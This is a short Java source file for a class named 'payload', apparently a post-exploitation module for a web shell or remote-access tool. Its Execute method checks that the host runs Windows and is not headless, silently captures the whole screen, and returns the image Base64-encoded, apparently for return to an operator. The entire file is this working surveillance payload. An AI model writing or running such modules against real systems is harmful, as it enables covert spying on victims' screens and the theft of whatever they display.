import java.io.*;
import java.util.Base64;
import java.nio.charset.StandardCharsets;

import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Rectangle;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

public class payload {
    public payload() {}

    private byte[] fnTakeScreenshotIfWindows() {
        String os = System.getProperty("os.name").toLowerCase();
        if (!os.contains("win")) {
            return "ERROR://Not windows".getBytes(StandardCharsets.UTF_8);
        }

        if (java.awt.GraphicsEnvironment.isHeadless()) {
            return "ERROR://Server is running in headless mode, cannot capture screen.".getBytes(StandardCharsets.UTF_8);
        }

        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenshot = robot.createScreenCapture(screenRect);
            
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(screenshot, "png", baos); 
            return baos.toByteArray();
        } 
        catch (Throwable e) {
            return ("ERROR: Failed to take screenshot. Reason: " + e.toString()).getBytes(StandardCharsets.UTF_8);
        }
    }

    public String Execute(Object param) throws Exception {
        return Base64.getEncoder().encodeToString(fnTakeScreenshotIfWindows());
    }
}